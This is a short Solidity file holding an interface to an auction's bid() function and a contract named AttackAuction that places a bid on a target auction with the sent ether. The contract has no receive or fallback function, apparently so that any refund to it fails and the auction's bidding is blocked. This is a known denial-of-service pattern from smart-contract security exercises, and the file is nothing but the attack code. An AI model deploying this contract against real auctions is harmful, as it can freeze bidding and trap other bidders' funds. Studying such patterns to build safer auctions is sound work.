//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IAuction {
    function bid() external payable;
}

contract AttackAuction {
    function attack(address _auction) external payable {
        IAuction(_auction).bid{value: msg.value}();
    }
}
